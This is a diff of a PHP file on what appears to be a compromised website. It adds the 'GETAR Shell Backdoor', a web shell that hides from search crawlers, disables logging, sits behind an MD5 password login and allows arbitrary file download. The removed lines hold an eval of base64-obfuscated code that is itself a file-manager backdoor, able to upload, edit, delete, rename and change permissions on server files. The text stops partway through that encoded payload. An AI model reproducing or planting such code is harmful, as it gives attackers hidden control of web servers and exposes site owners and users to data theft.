@@ -1,24 +1,703 @@
 <?php
 session_start();
-$ewean = 'dudakeren';
+error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
 
-if (!isset($_SESSION['authenticated'])) {
-    if (isset($_POST['password'])) {
-        if ($_POST['password'] === $ewean) {
-            $_SESSION['authenticated'] = true;
-        } else {
-            echo "Password salah!";
-        }
-    }
+$password 			= "831167d1d11e16b877055beb00ffec4b";
+$color 				= "#00ff00";
+$default_action 	= 'FilesMan';
+$default_use_ajax 	= true;
+$default_charset 	= 'UTF-8';
 
-    if (!isset($_SESSION['authenticated'])) {
-        echo '<form method="post">';
-        echo 'Password: <input type="password" name="password">';
-        echo '<input type="submit" value="Login">';
-        echo '</form>';
-        exit;
-    }
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+		header('HTTP/1.0 404 Not Found');
+		exit;
+	}
+}
+
+function login_shell() {
+?>
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
+		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
+		<meta name='author' content='CodeXploit|JANGAN-OM'/>
+		<meta name='author' content='GETAR'/>
+		<meta name='copyright' content='GETAR'/>
+		<meta name='description' content='GETAR Shell Backdoor'>
+		<meta name="theme-color" content="#000">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
+
+    <title>GETAR Shell Backdoor</title>
+    <style>
+    	body{
+    		background-color:black;
+    		}
+    	img{
+    		width: 450px;
+    		height: 450px;
+    	}
+    	input[type="password"]{
+    		background-color: transparent;
+    	}
+    	h2{
+    		font-family:"Rock Salt";
+    	}
+    </style>
+  </head>
+  <body class="text-white">
+    <div class="p-3">
+    	<h2 class="text-center">SEO GETAR NIH BOS</h2><hr>
+    	<img src="https://raw.githubusercontent.com/masihpemula88/masihpemula88/refs/heads/main/1.jpg" class="mx-auto d-block"><hr>
+    		<form method="post">
+    	<div class="row">
+    		<div class="col">
+    			<input type="password" name="pass" class="form-control">
+    		</div>
+    		<div class="col">
+    			<input type="submit" class="btn btn-outline-light btn-block" value="Login">
+    		</div>
+    	</div></form>
+    	<hr>
+    	<center>
+    		<small>Copyright &copy; <a href="#">GETAR</a></small>
+    	</center>
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+  </body>
+</html>
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
+	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+else
+login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+	@ob_clean();
+	$file = $_GET['file'];
+	header('Content-Description: File Transfer');
+	header('Content-Type: application/octet-stream');
+	header('Content-Disposition: attachment; filename="'.basename($file).'"');
+	header('Expires: 0');
+	header('Cache-Control: must-revalidate');
+	header('Pragma: public');
+	header('Content-Length: ' . filesize($file));
+	readfile($file);
+	exit;
 }
 ?>
-<?php eval("?
->".base64_decode("PD9waHAgaGVhZGVyKCJYLVhTUy1Qcm90ZWN0aW9uOiAwIik7b2Jfc3RhcnQoKTtzZXRfdGltZV9saW1pdCgwKTtlcnJvcl9yZXBvcnRpbmcoMCk7aW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCBGQUxTRSk7DQokQXJyYXkgPSBbDQoJCSc3MDY4NzA1Zjc1NmU2MTZkNjUnLA0KCQknNzA2ODcwNzY2NTcyNzM2OTZmNmUnLA0KCQknNjM2ODY0Njk3MicsDQoJCSc2NzY1NzQ2Mzc3NjQnLA0KCQknNzA3MjY1Njc1ZjczNzA2YzY5NzQnLA0KCQknNjM2ZjcwNzknLA0KCQknNjY2OTZjNjU1ZjY3NjU3NDVmNjM2ZjZlNzQ2NTZlNzQ3MycsDQoJCSc2MjYxNzM2NTM2MzQ1ZjY0NjU2MzZmNjQ2NScsDQoJCSc2OTczNWY2NDY5NzInLA0KCQknNmY2MjVmNjU2ZTY0NWY2MzZjNjU2MTZlMjgyOTNiJywNCgkJJzc1NmU2YzY5NmU2YicsDQoJCSc2ZDZiNjQ2OTcyJywNCgkJJzYzNjg2ZDZmNjQnLA0KCQknNzM2MzYxNmU2NDY5NzInLA0KCQknNzM3NDcyNWY3MjY1NzA2YzYxNjM2NScsDQoJCSc2ODc0NmQ2YzczNzA2NTYzNjk2MTZjNjM2ODYxNzI3MycsDQoJCSc3NjYxNzI1ZjY0NzU2ZDcwJywNCgkJJzY2NmY3MDY1NmUnLA0KCQknNjY3NzcyNjk3NDY1JywNCgkJJzY2NjM2YzZmNzM2NScsDQoJCSc2NDYxNzQ2NScsDQoJCSc2NjY5NmM2NTZkNzQ2OTZkNjUnLA0KCQknNzM3NTYyNzM3NDcyJywNCgkJJzczNzA3MjY5NmU3NDY2JywNCgkJJzY2Njk2YzY1NzA2NTcyNmQ3MycsDQoJCSc3NDZmNzU2MzY4JywNCgkJJzY2Njk2YzY1NWY2NTc4Njk3Mzc0NzMnLA0KCQknNzI2NTZlNjE2ZDY1JywNCgkJJzY5NzM1ZjYxNzI3MjYxNzknLA0KCQknNjk3MzVmNmY2MjZhNjU2Mzc0JywNCgkJJzczNzQ3MjcwNmY3MycsDQoJCSc2OTczNWY3NzcyNjk3NDYxNjI2YzY1JywNCgkJJzY5NzM1ZjcyNjU2MTY0NjE2MjZjNjUnLA0KCQknNzM3NDcyNzQ2Zjc0Njk2ZDY1JywNCgkJJzY2Njk2YzY1NzM2OTdhNjUnLA0KCQknNzI2ZDY0Njk3MicsDQoJCSc2ZjYyNWY2NzY1NzQ1ZjYzNmM2NTYxNmUnLA0KCQknNzI2NTYxNjQ2NjY5NmM2NScsDQoJCSc2MTczNzM2NTcyNzQnLA0KXTsNCiRfX18gPSBjb3VudCgkQXJyYXkpOw0KZm9yKCRpPTA7JGk8JF9fXzskaSsrKSB7DQoJJEdOSltdID0gdWhleCgkQXJyYXlbJGldKTsNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCgk8aHRtbCBkaXI9ImF1dG8iIGxhbmc9ImVuLVVTIj4NCg0KCQkJPGxpbmsgcmVsPSJpY29uIiBocmVmPSIvL3BuZ3BsYXkuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8xMy9Tbm93Zmxha2UtVHJhbnNwYXJlbnQtQmFja2dyb3VuZC5wbmciIC8+DQoJCQk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vbmVnYXQxdmUxMzM3LmdpdGh1Yi5pby9TaGVsbC9tYWluLmNzcyIgdHlwZT0idGV4dC9jc3MiPg0KDQoJCQk8c2NyaXB0IHNyYz0iLy9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMy4zLjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+DQoJCQk8c2NyaXB0IHNyYz0iLy9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvbm90aWZ5LzAuNC4yL25vdGlmeS5taW4uanMiPjwvc2NyaXB0Pg0KCQk8L2hlYWQ+DQoNCgkJPGJvZHk+DQoJCQk8aGVhZGVyPg0KCQkJCTxkaXYgY2xhc3M9InkgeCI+DQoJCQkJCTxhIGNsYXNzPSJhangiIGhyZWY9Ijw/cGhwIGVjaG8gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOz8+Ij4NCgkJCQkJCVZpbSBQYXRpb3IJCQkJCTwvYT4NCgkJCQk8L2Rpdj4NCg0KCQkJCTxkaXYgY2xhc3M9InEgeCB3Ij4NCgkJCQkJDQoJCQkJPC9kaXY+DQoJCQkJDQoJCQk8L2hlYWRlcj4NCg0KCQkJPGFydGljbGU+DQoJCQkJPGRpdiBjbGFzcz0iaSI+DQoJCQkJCTxpIGNsYXNzPSJmYXIgZmEtc25vd2ZsYWtlIj48L2k+DQoJCQkJCTw/cGhwIGVjaG8gJEdOSlswXSgpOz8+DQoNCgkJCQkJPGJyIC8+DQoNCgkJCQkJPGkgY2xhc3M9ImZhciBmYS1zbm93Zmxha2UiPjwvaT4gJnRoaW5zcDsmdGhpbnNwOzxiPlNPRlQgIDo8L2I+IDw/cGhwIGVjaG8gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddOz8+IDxiPlBIUCA6PC9iPiA8P3BocCBlY2hvICRHTkpbMV0oKTs/Pg0KDQoJCQkJCTxiciAvPg0KDQoJCQkJCTxpIGNsYXNzPSJmYXIgZmEtc25vd2ZsYWtlIj48L2k+DQoJCQkJCQ0KCQkJCQk8P3BocA0KCQkJCQlpZihpc3NldCgkX0dFVFsiZCJdKSkgew0KCQkJCQkJJGQgPSB1aGV4KCRfR0VUWyJkIl0pOw0KCQkJCQkJJEdOSlsyXSh1aGV4KCRfR0VUWyJkIl0pKTsNCgkJCQkJfQ0KCQkJCQllbHNlIHsNCgkJCQkJCSRkID0gJEdOSlszXSgpOw0KCQkJCQl9DQoJCQkJCSRrID0gJEdOSls0XSgiLyhcXFx8XC8pLyIsICRkICk7DQoJCQkJCWZvcmVhY2ggKCRrIGFzICRtID0+ICRsKSB7IA0KCQkJCQkJaWYoJGw9PScnICYmICRtPT0wKSB7DQoJCQkJCQkJZWNobyAnPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9MmYiPi88L2E+JzsNCgkJCQkJCX0NCgkJCQkJCWlmKCRsID09ICcnKSB7IA0KCQkJCQkJCWNvbnRpbnVlOw0KCQkJCQkJfQ0KCQkJCQkJZWNobyAnPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9JzsNCgkJCQkJCWZvciAoJGkgPSAwOyAkaSA8PSAkbTsgJGkrKykgew0KCQkJCQkJCWVjaG8gaGV4KCRrWyRpXSk7IA0KCQkJCQkJCWlmKCRpICE9ICRtKSB7DQoJCQkJCQkJCWVjaG8gJzJmJzsNCgkJCQkJCQl9DQoJCQkJCQl9DQoJCQkJCQllY2hvICciPicuJGwuJzwvYT4vJzsgDQoJCQkJCX0NCgkJCQkJPz4NCg0KCQkJCQk8YnIgLz4NCg0KCQkJCTwvZGl2Pg0KDQoJCQkJPGRpdiBjbGFzcz0idSI+DQoJCQkJCTw/cGhwIGVjaG8gJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ107Pz4gPGkgY2xhc3M9ImZhcyBmYS1zbm93Zmxha2UiPjwvaT4NCgkJCQkJPGJyIC8+DQoNCgkJCQkJPGJyIC8+DQoNCgkJCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCgkJCQkJCTxsYWJlbCBjbGFzcz0ibCB3Ij4NCgkJCQkJCQk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0ibltdIiBvbmNoYW5nZT0idGhpcy5mb3JtLnN1Ym1pdCgpIiBtdWx0aXBsZT4gJm5ic3A7VVBMT0FEDQoJCQkJCQk8L2xhYmVsPiZuYnNwOw0KCQkJCQk8L2Zvcm0+DQoNCgkJCQkJPD9waHANCgkJCQkJJG9fID0gWyANCgkJCQkJCQknPHNjcmlwdD4kLm5vdGlmeSgiJywNCgkJCQkJCQknIiwgeyBjbGFzc05hbWU6IjEiLGF1dG9IaWRlRGVsYXk6IDIwMDAscG9zaXRpb246ImxlZnQgYm90dG9tIiB9KTs8L3NjcmlwdD4nDQoJCQkJCQldOw0KCQkJCQkkZiA9ICRvX1swXS4nT0shJy4kb19bMV07DQoJCQkJCSRnID0gJG9fWzBdLidFUiEnLiRvX1sxXTsNCgkJCQkJaWYoaXNzZXQoJF9GSUxFU1sibiJdKSkgew0KCQkJCQkJJHogPSAkX0ZJTEVTWyJuIl1bIm5hbWUiXTsNCgkJCQkJCSRyID0gY291bnQoJHopOw0KCQkJCQkJZm9yKCAkaT0wIDsgJGkgPCAkciA7ICRpKysgKSB7DQoJCQkJCQkJaWYoJEdOSls1XSgkX0ZJTEVTWyJuIl1bInRtcF9uYW1lIl1bJGldLCAkelskaV0pKSB7DQoJCQkJCQkJCWVjaG8gJGY7DQoJCQkJCQkJfQ0KCQkJCQkJCWVsc2Ugew0KCQkJCQkJCQllY2hvICRnOw0KCQkJCQkJCX0NCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCQk/Pg0KDQoJCQkJPC9kaXY+DQoJCQkJCTw/cGhwDQoJCQkJCSRhXyA9ICc8dGFibGUgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSI3IiB3aWR0aD0iMTAwJSI+DQoJCQkJCQk8dGhlYWQ+DQoJCQkJCQkJPHRyPg0KCQkJCQkJCQk8dGg+JzsNCgkJCQkJJGJfID0gJzwvdGg+DQoJCQkJCQkJPC90cj4NCgkJCQkJCTwvdGhlYWQ+DQoJCQkJCQk8dGJvZHk+DQoJCQkJCQkJPHRyPg0KCQkJCQkJCQk8dGQ+PC90ZD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJCTx0cj4NCgkJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4nOw0KCQkJCQkkY18gPSAnPC90ZD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJPC90Ym9keT4NCgkJCQkJPC90YWJsZT4nOw0KCQkJCQkkZF8gPSAnPGJyIC8+DQoJCQkJCQkJCQkJPGJyIC8+DQoJCQkJCQkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InciIHZhbHVlPSImbmJzcDtPSyZuYnNwOyIgLz4NCgkJCQkJCQkJCTwvZm9ybT4nOw0KCQkJCQlpZihpc3NldCgkX0dFVFsicyJdKSkgew0KCQkJCQkJZWNobyAkYV8udWhleCgkX0dFVFsicyJdKS4kYl8uJw0KCQkJCQkJCQkJPHRleHRhcmVhIHJlYWRvbmx5PSJ5ZXMiPicuJEdOSlsxNV0oJEdOSls2XSh1aGV4KCRfR0VUWyJzIl0pKSkuJzwvdGV4dGFyZWE+DQoJCQkJCQkJCQk8YnIgLz4NCgkJCQkJCQkJCTxiciAvPg0KCQkJCQkJCQkJPGlucHV0IG9uY2xpY2s9ImxvY2F0aW9uLmhyZWY9XCc/ZD0nLiRfR0VUWyJkIl0uJyZlPScuJF9HRVRbInMiXS4nXCciIHR5cGU9InN1Ym1pdCIgY2xhc3M9InciIHZhbHVlPSImbmJzcDtFRElUJm5ic3A7IiAvPg0KCQkJCQkJCQknLiRjXzsNCgkJCQkJfQ0KCQkJCQllbHNlaWYoaXNzZXQoJF9HRVRbInkiXSkpIHsNCgkJCQkJCWVjaG8gJGFfLidSRVFVRVNUJy4kYl8uJw0KCQkJCQkJCQkJPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCgkJCQkJCQkJCQk8aW5wdXQgY2xhc3M9IngiIHR5cGU9InRleHQiIG5hbWU9IjEiIC8+Jm5ic3A7Jm5ic3A7DQoJCQkJCQkJCQkJPGlucHV0IGNsYXNzPSJ4IiB0eXBlPSJ0ZXh0IiBuYW1lPSIyIiAvPg0KCQkJCQkJCQkJCScuJGRfLicNCgkJCQkJCQkJCTxiciAvPg0KCQkJCQkJCQkJPHRleHRhcmVhIHJlYWRvbmx5PSJ5ZXMiPic7DQoNCgkJCQkJCQkJCWlmKGlzc2V0KCRfUE9TVFsiMiJdKSkgew0KCQkJCQkJCQkJCWVjaG8gJEdOSlsxNV0oZHJlKCRfUE9TVFsiMSJdLCAkX1BPU1RbIjIiXSkpOw0KCQkJCQkJCQkJfQ0KDQoJCQkJCQkJCWVjaG8gJzwvdGV4dGFyZWE+DQoJCQkJCQkJCScuJGNfOw0KCQkJCQl9DQoJCQkJCWVsc2VpZihpc3NldCgkX0dFVFsiZSJdKSkgew0KCQkJCQkJZWNobyAkYV8udWhleCgkX0dFVFsiZSJdKS4kYl8uJw0KCQkJCQkJCQkJPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCgkJCQkJCQkJCQk8dGV4dGFyZWEgbmFtZT0iZSIgY2xhc3M9Im8iPicuJEdOSlsxNV0oJEdOSls2XSh1aGV4KCRfR0VUWyJlIl0pKSkuJzwvdGV4dGFyZWE+DQoJCQkJCQkJCQkJPGJyIC8+DQoJCQkJCQkJCQkJPGJyIC8+DQoJCQkJCQkJCQkJPHNwYW4gY2xhc3M9InciPkJBU0U2NDwvc3Bhbj4gOg0KCQkJCQkJCQkJCTxzZWxlY3QgaWQ9ImI2NCIgbmFtZT0iYjY0Ij4NCgkJCQkJCQkJCQkJPG9wdGlvbiB2YWx1ZT0iMCI+WDwvb3B0aW9uPg0KCQkJCQkJCQkJCQk8b3B0aW9uIHZhbHVlPSIxIj5ZPC9vcHRpb24+DQoJCQkJCQkJCQkJPC9zZWxlY3Q+DQoJCQkJCQkJCQkJJy4kZF8uJw0KCQkJCQkJCQknLiRjXy4nDQoJCQkJCQkJCQ0KCQkJCQk8c2NyaXB0Pg0KCQkJCQkJJCgiI2I2NCIpLmNoYW5nZShmdW5jdGlvbigpIHsNCgkJCQkJCQlpZigkKCIjYjY0IG9wdGlvbjpzZWxlY3RlZCIpLnZhbCgpID09IDApIHsNCgkJCQkJCQkJdmFyIFggPSAkKCJ0ZXh0YXJlYSIpLnZhbCgpOw0KCQkJCQkJCQl2YXIgWiA9IGF0b2IoWCk7DQoJCQkJCQkJCSQoInRleHRhcmVhIikudmFsKFopOw0KCQkJCQkJCX0NCgkJCQkJCQllbHNlIHsNCgkJCQkJCQkJdmFyIE4gPSAkKCJ0ZXh0YXJlYSIpLnZhbCgpOw0KCQkJCQkJCQl2YXIgSSA9IGJ0b2EoTik7DQoJCQkJCQkJCSQoInRleHRhcmVhIikudmFsKEkpOw0KCQkJCQkJCX0NCgkJCQkJCX0pOw0KCQkJCQk8L3NjcmlwdD4nOw0KCQkJCQlpZihpc3NldCgkX1BPU1RbImUiXSkpIHsNCgkJCQkJCWlmKCRfUE9TVFsiYjY0Il0gPT0gIjEiKSB7DQoJCQkJCQkJJGV4ID0gJEdOSls3XSgkX1BPU1RbImUiXSk7DQoJCQkJCQl9DQoJCQkJCQllbHNlIHsNCgkJCQkJCQkkZXggPSAkX1BPU1RbImUiXTsNCgkJCQkJCX0NCgkJCQkJCSRmcCA9ICRHTkpbMTddKHVoZXgoJF9HRVRbImUiXSksICd3Jyk7DQoJCQkJCQlpZigkR05KWzE4XSgkZnAsICRleCkpIHsNCgkJCQkJCQlPSygpOw0KCQkJCQkJfQ0KCQkJCQkJZWxzZSB7DQoJCQkJCQkJRVIoKTsNCgkJCQkJCX0NCgkJCQkJCSRHTkpbMTldKCRmcCk7DQoJCQkJCSAgfQ0KCQkJCQl9DQoJCQkJCWVsc2VpZihpc3NldCgkX0dFVFsieCJdKSkgew0KCQkJCQkJcmVjKHVoZXgoJF9HRVRbIngiXSkpOw0KCQkJCQkJaWYoJEdOSlsyNl0odWhleCgkX0dFVFsieCJdKSkpIHsNCgkJCQkJCQlFUigpOw0KCQkJCQkJfQ0KCQkJCQkJZWxzZSB7DQoJCQkJCQkJT0soKTsNCgkJCQkJCX0NCg0KCQkJCQl9DQoJCQkJCWVsc2VpZihpc3NldCgkX0dFVFsidCJdKSkgew0KCQkJCQkJZWNobyAkYV8udWhleCgkX0dFVFsidCJdKS4kYl8uJw0KCQkJCQkJCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQkJCQkJCQkJPGlucHV0IG5hbWU9InQiIGNsYXNzPSJ4IiB0eXBlPSJ0ZXh0IiB2YWx1ZT0iJy4kR05KWzIwXSgiWS1tLWQgSDppIiwgJEdOSlsyMV0odWhleCgkX0dFVFsidCJdKSkpLiciPg0KCQkJCQkJCQkJCScuJGRfLicNCgkJCQkJCQkJJy4kY187DQoJCQkJCWlmKCAhZW1wdHkoJF9QT1NUWyJ0Il0pICkgew0KCQkJCQkJJHAgPSAkR05KWzMzXSgkX1BPU1RbInQiXSk7DQoJCQkJCQlpZigkcCkgew0KCQkJCQkJCWlmKCEkR05KWzI1XSh1aGV4KCRfR0VUWyJ0Il0pLCRwLCRwKSkgew0KCQkJCQkJCQlFUigpOw0KCQkJCQkJCX0NCgkJCQkJCQllbHNlIHsNCgkJCQkJCQkJT0soKTsNCgkJCQkJCQl9DQoJCQkJCQl9DQoJCQkJCQllbHNlIHsNCgkJCQkJCQlFUigpOw0KCQkJCQkJfQ0KCQkJCQkgIH0NCgkJCQkJfQ0KCQkJCQllbHNlaWYoaXNzZXQoJF9HRVRbImsiXSkpIHsNCgkJCQkJCWVjaG8gJGFfLnVoZXgoJF9HRVRbImsiXSkuJGJfLicNCgkJCQkJCQkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KCQkJCQkJCQkJCTxpbnB1dCBuYW1lPSJiIiBjbGFzcz0ieCIgdHlwZT0idGV4dCIgdmFsdWU9IicuJEdOSlsyMl0oJEdOSlsyM10oJyVvJywgJEdOSlsyNF0odWhleCgkX0dFVFsiayJdKSkpLCAtNCkuJyI+DQoJCQkJCQkJCQkJJy4kZF8uJw0KCQkJCQkJCQknLiRjXzsNCgkJCQkJaWYoIWVtcHR5KCRfUE9TVFsiYiJdKSkgew0KCQkJCQkJJHggPSAkX1BPU1RbImIiXTsNCgkJCQkJCSR0ID0gMDsNCgkJCQkJZm9yKCRpPXN0cmxlbigkeCktMTskaT49MDstLSRpKQ0KCQkJCQkJJHQgKz0gKGludCkkeFskaV0qcG93KDgsIChzdHJsZW4oJHgpLSRpLTEpKTsNCgkJCQkJaWYoISRHTkpbMTJdKHVoZXgoJF9HRVRbImsiXSksICR0KSkgew0KCQkJCQkJRVIoKTsNCgkJCQkJfQ0KCQkJCQllbHNlIHsNCgkJCQkJCU9LKCk7DQoJCQkJCQkgIH0NCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCQllbHNlaWYoaXNzZXQoJF9HRVRbImwiXSkpIHsNCgkJCQkJCWVjaG8gJGFfLicrRElSJy4kYl8uJw0KCQkJCQkJCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQkJCQkJCQkJPGlucHV0IG5hbWU9ImwiIGNsYXNzPSJ4IiB0eXBlPSJ0ZXh0IiB2YWx1ZT0iIj4NCgkJCQkJCQkJCQknLiRkXy4nDQoJCQkJCQkJCScuJGNfOw0KCQkJCQlpZihpc3NldCgkX1BPU1RbImwiXSkpIHsNCgkJCQkJCWlmKCEkR05KWzExXSgkX1BPU1RbImwiXSkpIHsNCgkJCQkJCQlFUigpOw0KCQkJCQkJfQ0KCQkJCQkJZWxzZSB7DQoJCQkJCQkJT0soKTsNCgkJCQkJCX0NCgkJCQkJICB9DQoJCQkJCX0NCgkJCQkJZWxzZWlmKGlzc2V0KCRfR0VUWyJxIl0pKSB7DQoJCQkJCQlpZigkR05KWzEwXShfX0ZJTEVfXykpIHsNCgkJCQkJCQkkR05KWzM4XSgkR05KWzldKTsNCgkJCQkJCQloZWFkZXIoIkxvY2F0aW9uOiAiLmJhc2VuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKS4iIik7DQoJCQkJCQkJZXhpdCgpOw0KCQkJCQkJfQ0KCQkJCQkJZWxzZSB7DQoJCQkJCQkJZWNobyAkZzsNCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCQllbHNlaWYoaXNzZXQoJF9HRVRbIm4iXSkpIHsNCgkJCQkJCWVjaG8gJGFfLicrRklMRScuJGJfLicNCgkJCQkJCQkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KCQkJCQkJCQkJCTxpbnB1dCBuYW1lPSJuIiBjbGFzcz0ieCIgdHlwZT0idGV4dCIgdmFsdWU9IiI+DQoJCQkJCQkJCQkJJy4kZF8uJw0KCQkJCQkJCQknLiRjXzsNCgkJCQkJaWYoaXNzZXQoJF9QT1NUWyJuIl0pKSB7DQoJCQkJCQlpZighJEdOSlsyNV0oJF9QT1NUWyJuIl0pKSB7DQoJCQkJCQkJRVIoKTsNCgkJCQkJCX0NCgkJCQkJCWVsc2Ugew0KCQkJCQkJCU9LKCk7DQoJCQkJCQl9DQoJCQkJCSAgfQ0KCQkJCQl9DQoJCQkJCWVsc2VpZihpc3NldCgkX0dFVFsiciJdKSkgew0KCQkJCQkJZWNobyAkYV8udWhleCgkX0dFVFsiciJdKS4kYl8uJw0KCQkJCQkJCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQkJCQkJCQkJPGlucHV0IG5hbWU9InIiIGNsYXNzPSJ4IiB0eXBlPSJ0ZXh0IiB2YWx1ZT0iJy51aGV4KCRfR0VUWyJyIl0pLiciPg0KCQkJCQkJCQkJCScuJGRfLicNCgkJCQkJCQkJJy4kY187DQoJCQkJCWlmKGlzc2V0KCRfUE9TVFsiciJdKSkgew0KCQkJCQkJaWYoJEdOSlsyNl0oJF9QT1NUWyJyIl0pKSB7DQoJCQkJCQkJRVIoKTsNCgkJCQkJCX0NCgkJCQkJCWVsc2Ugew0KCQkJCQkJCWlmKCRHTkpbMjddKHVoZXgoJF9HRVRbInIiXSksICRfUE9TVFsiciJdKSkgew0KCQkJCQkJCQlPSygpOw0KCQkJCQkJCX0NCgkJCQkJCQllbHNlIHsNCgkJCQkJCQkJRVIoKTsNCgkJCQkJCQl9DQoJCQkJCQkgIH0NCgkJCQkJICAgfQ0KCQkJCQl9DQoJCQkJCWVsc2VpZihpc3NldCgkX0dFVFsieiJdKSkgew0KCQkJCQkJJHppcCA9IG5ldyBaaXBBcmNoaXZlOw0KCQkJCQkJJHJlcyA9ICR6aXAtPm9wZW4odWhleCgkX0dFVFsieiJdKSk7DQoJCQkJCQkJaWYoJHJlcyA9PT0gVFJVRSkgew0KCQkJCQkJCQkkemlwLT5leHRyYWN0VG8odWhleCgkX0dFVFsiZCJdKSk7DQoJCQkJCQkJCSR6aXAtPmNsb3NlKCk7DQoJCQkJCQkJCU9LKCk7DQoJCQkJCQkJfSBlbHNlIHsNCgkJCQkJCQkJRVIoKTsNCgkJCQkJCSAgfQ0KCQkJCQl9DQoJCQkJCWVsc2Ugew0KCQkJCQllY2hvICc8dGFibGUgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSI3IiB3aWR0aD0iMTAwJSI+DQoJCQkJCQk8dGhlYWQ+DQoJCQkJCQkJPHRyPg0KCQkJCQkJCQk8dGggd2lkdGg9IjQ0JSI+WyBCZWhlbW90aCBdPC90aD4NCgkJCQkJCQkJPHRoIHdpZHRoPSIxMSUiPlsgQmVlbHplYnViIF08L3RoPg0KCQkJCQkJCQk8dGggd2lkdGg9IjE3JSI+WyBBc21vZGV1cyBdPC90aD4NCgkJCQkJCQkJPHRoIHdpZHRoPSIxNyUiPlsgU2F0YW5hcyBdPC90aD4NCgkJCQkJCQkJPHRoIHdpZHRoPSIxMSUiPlsgTHVjaWZlciBdPC90aD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJPC90aGVhZD4NCgkJCQkJCTx0Ym9keT4NCgkJCQkJCQk8dHI+DQoJCQkJCQkJCTx0ZD4NCgkJCQkJCQkJCTxhIGNsYXNzPSJhangiIGhyZWY9Ij9kPScuaGV4KCRkKS4nJm4iPkFkZCBGaWxlPC9hPg0KCQkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9Jy5oZXgoJGQpLicmbCI+QWRkIERpcjwvYT4NCgkJCQkJCQkJPC90ZD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJJzsNCg0KCQkJCQkJCSRoID0gIiI7DQoJCQkJCQkJJGogPSAiIjsNCgkJCQkJCQkkdyA9ICRHTkpbMTNdKCRkKTsNCgkJCQkJCQlpZigkR05KWzI4XSgkdykgfHwgJEdOSlsyOV0oJHcpKSB7DQoJCQkJCQkJZm9yZWFjaCgkdyBhcyAkYyl7DQoJCQkJCQkJCSRlID0gJEdOSlsxNF0oIlxcIiwgIi8iLCAkZCk7DQoJCQkJCQkJCWlmKCEkR05KWzMwXSgkYywgIi56aX